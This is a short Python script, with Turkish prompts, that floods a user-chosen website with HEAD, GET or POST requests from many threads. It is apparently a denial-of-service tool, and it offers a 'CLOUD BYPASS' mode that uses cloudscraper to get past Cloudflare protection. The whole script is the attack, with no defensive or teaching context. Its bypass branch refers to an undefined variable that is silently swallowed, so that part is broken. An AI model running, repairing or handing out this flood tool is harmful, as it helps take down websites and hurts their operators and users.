import requests
import threading
import os
import cloudscraper
os.system("clear")
scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'chrome',
        'platform': 'android',
        'desktop': False
    }
)
url=input("Site Linki Giriniz: ")
bot=int(input("Bot Sayı Girin: "))
print("[1] HEAD\n[2] GET\n[3] POST\n[4] CLOUD BYPASS\n")
cf=str(input("Method Seçiniz: "))
if cf =="2":
    def ch():
        he = { 'User-Agent': 'Mozilla/5.0', }
        for i in range(bot):
            try:
                x = requests.get(url, headers=he)
            except:
                    pass
elif cf =="1":
    def ch():
        he = { 'User-Agent': 'Mozilla/5.0', }
        for i in range(bot):
            try:
                x = requests.head(url ,headers=he)
            except:
                    pass
elif cf =="3":
    def ch():
        he = { 'User-Agent': 'Mozilla/5.0', }
        for i in range(bot):
            try:
                x = requests.post(url,headers=he)
            except:
                    pass
elif cf =="4":
    he = { 'User-Agent': 'Mozilla/5.0', }
    os.system("clear")
    print("[1] HEAD\n[2] GET\n[3] POST\n")
    mt=str(input("Method Seçiniz: "))
    def ch():
        he = { 'User-Agent': 'Mozilla/5.0', }
        for i in range(bot):
            try:
                if mt=="1":
                    x = scraper.head(url,headers=hea)
                elif mt=="2":
                    x = scraper.get(url,headers=hea)
                elif mt=="3":
                    x = scraper.post(url,headers=hea)
            except:
                    pass
for i in range(bot):
    ta = threading.Thread(target=ch)
    ta.start()
